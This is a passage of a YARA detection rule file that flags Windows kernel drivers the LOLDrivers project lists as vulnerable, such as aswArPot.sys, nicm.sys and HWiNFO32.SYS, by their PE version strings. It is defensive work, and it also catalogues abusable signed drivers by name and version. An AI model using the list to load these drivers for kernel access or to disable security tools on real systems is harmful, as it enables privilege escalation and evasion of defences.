0049006e007400650072006e0061006c004e0061006d0065[1-8]00700072006f0063006500780070002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00700072006f0063006500780070002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004d002e002000520075007300730069006e006f007600690063006800200031003900390036002d0032003000310030 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Multitheftauto_Mtasanandreas_9F4C_RID399A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - FairplayKD.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 19:10:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004d0075006c007400690020005400680065006600740020004100750074006f0020007000610074006300680020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d0075006c007400690020005400680065006600740020004100750074006f } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]003300360037002e0033003200360039002e00360031002e00360034 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]003300360037002e0033003200360039002e00360031002e00360034 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d00540041002000530061006e00200041006e00640072006500610073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]002800430029002000320030003000330020002d002000320030003100370020004d0075006c007400690020005400680065006600740020004100750074006f } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpotsys_Avastantivirus_2732_RID3EAE : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:47:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310039002e0031002e0034003100330032002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310039002e0031002e0034003100330032002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300031003800200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtier_A153_RID36A3 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nicm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:04:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c00200043006c00690065006e007400200050006f00720074006100620069006c0069007400790020004c0061007900650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e00310031002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e00310031 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00490043004d002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000310034002c0020004e006f00760065006c006c002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Ludashicom_Computerzsys_3F36_RID3796 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:44:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]006c007500640061007300680069002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0031003000320030002e0031003000330030002e0031003200310037 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0031003000320030002e0031003000330030002e0031003200310037 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]9c8159275e08 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]7248674362406709002000280043002900200032003000310030002d00320030003200300020007700770077002e006c007500640061007300680069002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realixtm_Hwinfosys_Hwinfokerneldriver_7702_RID3D3A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - HWiNFO32.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:45:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004800570069004e0046004f003300320020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200450041004c0069005800280074006d0029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0037002e003700300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0037002e00370030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004800570069004e0046004f003300320020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290031003900390039002d00320030003100300020004d0061007200740069006e0020004d0061006c00ed006b0020002d0020005200450041004c00690058 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Tgsoftsas_Viragtsys_Viritagentsystem_EF6D_RID3D33 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - viragt64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:44:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0054004700200053006f0066007400200053002e0061002e0073002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c002000380030002c00200030002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002c002000380030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]007600690072006100670074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]007600690072006100670074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200054004700200053006f0066007400200053002e0061002e0073002e00200032003000300036002c002000320030003100360020002d0020007700770077002e007400670073006f00660074002e00690074 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Microfocus_Microfocusxtier_95D5_RID38CA : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - libnicm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 18:36:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0058005400690065007200200043004f004d0020005300650072007600690063006500730020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900630072006f00200046006f006300750073 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e00310032002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e00310032 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d006900630072006f00200046006f006300750073002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006c00690062006e00690063006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000310037002c0020004d006900630072006f00200046006f006300750073002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Z_Computerzsys_Zwuqisystemdriver_61E7_RID3B98 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:35:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005a0077007500710069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005a6b665668 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0031002e0039002e003400310036 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0031002e0039002e003400310036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005a0077007500710069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300038002d00320030003000390020007700770077002e007a0077007500710069002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Realixtm_Hwinfosys_Hwinfokerneldriver_8DCE_RID3D6E : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - HWiNFO32.SYS\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:54:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004800570069004e0046004f003300320020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005200450041004c0069005800280074006d0029 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0037002e003500300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0037002e00350030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004800570069004e0046004f003300320020004b00650072006e0065006c0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004800570069004e0046004f00330032002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290031003900390039002d00320030003100300020004d0061007200740069006e0020004d0061006c00ed006b0020002d0020005200450041004c00690058 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Trendmicroinc_Tmcommsys_Trendmicroeyes_E3EF_RID3DCF : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - TmComm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:10:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c0065 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0037002e0030002e0030002e0031003100300031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0037002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000200028004300290020002000320030003100360020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule PUA_VULN_Driver_Arthurliberman_Alsysiosys_Alsysio_7F37_RID3BB0 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ALSysIO64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:39:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041004c0053007900730049004f } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041007200740068007500720020004c0069006200650072006d0061006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0030002e0039002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0030002e0039002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0041004c0053007900730049004f002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041004c0053007900730049004f } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0041004c0053007900730049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300033002d003200300030003900200041007200740068007500720020004c0069006200650072006d0061006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Panyazilimbilisimteknolojileriticltdsti_Paniosys_Paniolibrary_F596_RID4764 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - PanIO.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:59:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00540065006d0070006500720061007400750072006500200061006e0064002000730079007300740065006d00200069006e0066006f0072006d006100740069006f006e0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00500061006e002000590061007a0069006c0069006d002000420069006c006900730069006d002000540065006b006e006f006c006f006a0069006c0065007200690020005400690063002e0020004c00740064002e0020005300740069002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00500061006e0049004f002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00500061006e0049004f0020004c006900620072006100720079 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00500061006e0049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280063002900200032003000310032002d0032003000310034002000500061006e002000590061007a0069006c0069006d002000420069006c006900730069006d002000540065006b006e006f006c006f006a0069006c0065007200690020005400690063002e0020004c00740064002e0020005300740069002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Novellinc_Novellxtier_6C5A_RID36B8 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nicm.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:07:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e006f00760065006c006c00200043006c00690065006e007400200050006f00720074006100620069006c0069007400790020004c0061007900650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e006f00760065006c006c002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0033002e0031002e0036002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0033002e0031002e0036 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e006f00760065006c006c002000580054006900650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00490043004d002e005300590053 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00280043002900200043006f007000790072006900670068007400200032003000300030002d0032003000310031002c0020004e006f00760065006c006c002c00200049006e0063002e00200041006c006c0020005200690067006800740073002000520065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avastsoftware_Aswarpot_Avastantivirus_1768_RID3D57 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:50:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0041007600610073007400200041006e0074006900200052006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0041005600410053005400200053006f006600740077006100720065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320030002e0038002e003100330037002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320030002e0038002e003100330037002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041007600610073007400200041006e00740069007600690072007500730020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028006300290020003200300032003000200041005600410053005400200053006f006600740077006100720065 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule PUA_VULN_Driver_Cn_Computerzsys_3913_RID342C : CHINA DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 15:19:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]003300360030002e0063006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e00310031002e003400310035 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036002e00310031002e003400310035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]003300360030786c4ef659275e08 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]7248674362406709002000280043002900200032003000310030002d00320030003100310020003300360030002e0063006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Cn_Computerzsys_767E_RID3445 : CHINA DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 15:23:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]003300360030002e0063006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e00310034002e0031003000320034 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036002e00310034002e0031003000320034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]9c8159275e08 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]7248674362406709002000280043002900200032003000310030002d00320030003100340020007700770077002e006c007500640061007300680069002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Avgtechnologiesczsro_Aswarpotsys_Avginternetsecuritysystem_9A54_RID466C : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - aswArPot.sys, avgArPot.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:17:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00410056004700200061006e0074006900200072006f006f0074006b00690074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310039002e0031002e0034003100330032002e0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310039002e0031002e0034003100330032002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00410056004700200049006e007400650072006e00650074002000530065006300750072006900740079002000530079007300740065006d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006100730077004100720050006f0074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310038002000410056004700200054006500630068006e006f006c006f006700690065007300200043005a002c00200073002e0072002e006f002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Oti_Otipcibussys_Kernelmodedrivertoaccessphysicalmemoryandports_4E3E_RID4858 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - otipcibus.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 05:39:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0048006100720064007700610072006500200041006300630065007300730020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004f00540069 } \n      